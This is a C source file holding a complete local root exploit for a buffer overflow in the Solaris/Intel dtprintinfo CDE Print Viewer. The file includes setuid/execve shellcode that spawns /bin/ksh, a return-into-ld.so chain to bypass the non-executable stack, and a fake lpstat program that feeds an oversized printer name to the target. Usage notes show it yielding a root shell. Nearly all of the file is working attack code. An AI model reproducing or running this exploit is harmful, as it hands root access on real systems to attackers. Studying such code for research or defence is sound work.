/*
 * raptor_dtprintname_intel.c - dtprintinfo 0day, Solaris/Intel
 * Copyright (c) 2004-2019 Marco Ivaldi <raptor@0xdeadbeef.info>
 *
 * 0day buffer overflow in the dtprintinfo(1) CDE Print Viewer, leading to
 * local root. Many thanks to Dave Aitel for discovering this vulnerability
 * and for his interesting research activities on Solaris/SPARC.
 *
 * "None of my dtprintinfo work is public, other than that 0day pack being
 * leaked to all hell and back. It should all basically still work. Let's
 * keep it that way, cool? :>" -- Dave Aitel
 *
 * This exploit uses the ret-into-ld.so technique to bypass the non-exec 
 * stack protection. If experiencing troubles with null-bytes inside the 
 * ld.so.1 memory space, try returning to sprintf() instead of strcpy().
 *
 * Usage:
 * $ gcc raptor_dtprintname_intel.c -o raptor_dtprintname_intel -Wall
 * [on your xserver: disable the access control]
 * $ ./raptor_dtprintname_intel 192.168.1.1:0
 * [...]
 * # id
 * uid=0(root) gid=1(other)
 * #
 *
 * Tested on:
 * SunOS 5.10 Generic_147148-26 i86pc i386 i86pc (Solaris 10 1/13)
 * [previous Solaris versions are also vulnerable]
 */

#include <fcntl.h>
#include <link.h>
#include <procfs.h>
#include <stdio.h>
#include <stdlib.h>
#include <strings.h>
#include <unistd.h>
#include <sys/systeminfo.h>

#define INFO1	"raptor_dtprintname_intel.c - dtprintinfo 0day, Solaris/Intel"
#define INFO2	"Copyright (c) 2004-2019 Marco Ivaldi <raptor@0xdeadbeef.info>"

#define	VULN	"/usr/dt/bin/dtprintinfo"	// the vulnerable program
#define	BUFSIZE	301				// size of the printer name

char sc[] = /* Solaris/x86 shellcode (8 + 8 + 27 = 43 bytes) */
/* double setuid() */
"\x31\xc0\x50\x50\xb0\x17\xcd\x91"
"\x31\xc0\x50\x50\xb0\x17\xcd\x91"
/* execve() */
"\x31\xc0\x50\x68/ksh\x68/bin"
"\x89\xe3\x50\x53\x89\xe2\x50"
"\x52\x53\xb0\x3b\x50\xcd\x91";

/* globals */
char	*env[256];
int	env_pos = 0, env_len = 0;

/* prototypes */
int	add_env(char *string);
void	check_zero(int addr, char *pattern);
int	search_ldso(char *sym);
int	search_rwx_mem(void);
void	set_val(char *buf, int pos, int val);

/*
 * main()
 */
int main(int argc, char **argv)
{
	char	buf[BUFSIZE], ksh_var[16];
	char	platform[256], release[256], display[256];
	int	i, offset, sc_addr, ksh_pos;
	int	plat_len, prog_len;

	char	*arg[2] = {"foo", NULL};
	int	sb = ((int)argv[0] | 0xfff);	/* stack base */
	int	ret = search_ldso("strcpy");	/* or sprintf */
	int	rwx_mem = search_rwx_mem();	/* rwx memory */

	/* fake lpstat code */
	if (!strcmp(argv[0], "lpstat")) {

		/* check command line */
		if (argc != 2)
			exit(1);

		/* get the shellcode address from the environment */
		sc_addr = (int)strtoul(getenv("KSH"), (char **)NULL, 0);

		/* prepare the evil printer name */
		memset(buf, 'A', sizeof(buf));
		buf[sizeof(buf) - 1] = 0x0;

		/* fill with ld.so.1 address, saved eip, and arguments */
		for (i = 0; i < BUFSIZE; i += 4) {
			set_val(buf, i, ret);		/* strcpy */
			set_val(buf, i += 4, rwx_mem);	/* saved eip */
			set_val(buf, i += 4, rwx_mem);	/* 1st argument */
			set_val(buf, i += 4, sc_addr);	/* 2nd argument */
		}

		/* print the expected output and exit */
		if(!strcmp(argv[1], "-v")) {
			fprintf(stderr, "lpstat called with -v\n");
			printf("device for %s: /dev/null\n", buf);
		} else {
			fprintf(stderr, "lpstat called with -d\n");
			printf("system default destination: %s\n", buf);
		}
		exit(0);
	}

	/* print exploit information */
	fprintf(stderr, "%s\n%s\n\n", INFO1, INFO2);

	/* read command line */
	if (argc != 2) {
		fprintf(stderr, "usage: %s xserver:display\n\n", argv[0]);
		exit(1);
	}
	sprintf(display, "DISPLAY=%s", argv[1]);

	/* get some system information */
	sysinfo(SI_PLATFORM, platform, sizeof(platform) - 1);
	sysinfo(SI_RELEASE, release, sizeof(release) - 1);

	/* fill the envp, keeping padding */
	add_env(sc);
	ksh_pos = env_pos;
	add_env("KSH=0x42424242");
	add_env(display);
	add_env("PATH=.:/usr/bin");
	add_env("HOME=/tmp");
	add_env(NULL);

	/* calculate the offset to the shellcode */
	plat_len = strlen(platform) + 1;
	prog_len = strlen(VULN) + 1;
	offset = 5 + env_len + plat_len + prog_len;

	/* calculate the shellcode address */
	sc_addr = sb - offset;

	/* overwrite the KSH env var with the right address */
	sprintf(ksh_var, "KSH=0x%x", sc_addr);
	env[ksh_pos] = ksh_var;

	/* create a symlink for the fake lpstat */
	unlink("lpstat");
	symlink(argv[0], "lpstat");

	/* print some output */
	fprintf(stderr, "Using SI_PLATFORM\t: %s (%s)\n", platform, release);
	fprintf(stderr, "Using stack base\t: 0x%p\n", (void *)sb);
	fprintf(stderr, "Using rwx_mem address\t: 0x%p\n", (void *)rwx_mem);
	fprintf(stderr, "Using sc address\t: 0x%p\n", (void *)sc_addr);
	fprintf(stderr, "Using strcpy() address\t: 0x%p\n\n", (void *)ret);

	/* run the vulnerable program */
	execve(VULN, arg, env);
	perror("execve");
	exit(0);
}

/*
 * add_env(): add a variable to envp and pad if needed
 */
int add_env(char *string)
{
	int	i;

	/* null termination */
	if (!string) {
		env[env_pos] = NULL;
		return(env_len);
	}

	/* add the variable to envp */
	env[env_pos] = string;
	env_len += strlen(string) + 1;
	env_pos++;

	/* pad the envp using zeroes */
	if ((strlen(string) + 1) % 4)
		for (i = 0; i < (4 - ((strlen(string)+1)%4)); i++, env_pos++) {
			env[env_pos] = string + strlen(string);
			env_len++;
		}

	return(env_len);
}

/*
 * check_zero(): check an address for the presence of a 0x00
 */
void check_zero(int addr, char *pattern)
{
	if (!(addr & 0xff) || !(addr & 0xff00) || !(addr & 0xff0000) ||
	    !(addr & 0xff000000)) {
		fprintf(stderr, "Error: %s contains a 0x00!\n", pattern);
		exit(1);
	}
}

/*
 * search_ldso(): search for a symbol inside ld.so.1
 */
int search_ldso(char *sym)
{
	int		addr;
	void		*handle;
	Link_map	*lm;

	/* open the executable object file */
	if ((handle = dlmopen(LM_ID_LDSO, NULL, RTLD_LAZY)) == NULL) {
		perror("dlopen");
		exit(1);
	}

	/* get dynamic load information */
	if ((dlinfo(handle, RTLD_DI_LINKMAP, &lm)) == -1) {
		perror("dlinfo");
		exit(1);
	}

	/* search for the address of the symbol */
	if ((addr = (int)dlsym(handle, sym)) == NULL) {
		fprintf(stderr, "sorry, function %s() not found\n", sym);
		exit(1);
	}

	/* close the executable object file */
	dlclose(handle);

	check_zero(addr - 4, sym);
	return(addr);
}

/*
 * search_rwx_mem(): search for an RWX memory segment valid for all
 * programs (typically, /usr/lib/ld.so.1) using the proc filesystem
 */
int search_rwx_mem(void)
{
	int	fd;
	char	tmp[16];
	prmap_t	map;
	int	addr = 0, addr_old;

	/* open the proc filesystem */
	sprintf(tmp,"/proc/%d/map", (int)getpid());
	if ((fd = open(tmp, O_RDONLY)) < 0) {
		fprintf(stderr, "can't open %s\n", tmp);
		exit(1);
	}

	/* search for the last RWX memory segment before stack (last - 1) */
	while (read(fd, &map, sizeof(map)))
		if (map.pr_vaddr)
			if (map.pr_mflags & (MA_READ | MA_WRITE | MA_EXEC)) {
				addr_old = addr;
				addr = map.pr_vaddr;
			}
	close(fd);

	/* add 4 to the exact address NULL bytes */
	if (!(addr_old & 0xff))
		addr_old |= 0x04;
	if (!(addr_old & 0xff00))
		addr_old |= 0x0400;

	return(addr_old);
}

/*
 * set_val(): copy a dword inside a buffer (little endian)
 */
void set_val(char *buf, int pos, int val)
{
	buf[pos] =	(val & 0x000000ff);
	buf[pos + 1] =	(val & 0x0000ff00) >> 8;
	buf[pos + 2] =	(val & 0x00ff0000) >> 16;
	buf[pos + 3] =	(val & 0xff000000) >> 24;
}
